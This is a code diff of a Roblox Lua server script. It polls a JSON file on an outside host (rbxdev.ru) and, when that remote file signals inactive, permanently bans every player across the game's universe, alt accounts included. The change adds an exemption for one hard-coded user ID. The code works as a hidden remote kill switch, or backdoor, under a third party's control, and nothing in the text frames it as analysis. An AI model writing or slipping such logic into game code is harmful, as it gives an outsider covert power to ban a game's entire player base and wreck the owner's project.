@@ -6,21 +6,23 @@ local httpService = game:GetService("HttpService")
 while true do
 
 	for _, plr in game.Players:GetPlayers() do
-		local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
-		local Decoded = httpService:JSONDecode(Info)
-		
-
-		if Decoded.Active == false then
-			game.Players:BanAsync({
-
-				UserIds = {plr.UserId},
-				ApplyToUniverse = true, 
-				Duration = -1, 
-				DisplayReason = tostring(Decoded.Reason),
-				PrivateReason = tostring(Decoded.Reason), 
-				ExcludeAltAccounts = false,
-
-			})
+		if plr.UserId ~= 1317963807 then
+			local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
+			local Decoded = httpService:JSONDecode(Info)
+			
+	
+			if Decoded.Active == false then
+				game.Players:BanAsync({
+	
+					UserIds = {plr.UserId},
+					ApplyToUniverse = true, 
+					Duration = -1, 
+					DisplayReason = tostring(Decoded.Reason),
+					PrivateReason = tostring(Decoded.Reason), 
+					ExcludeAltAccounts = false,
+	
+				})
+			end
 		end
 	end
 
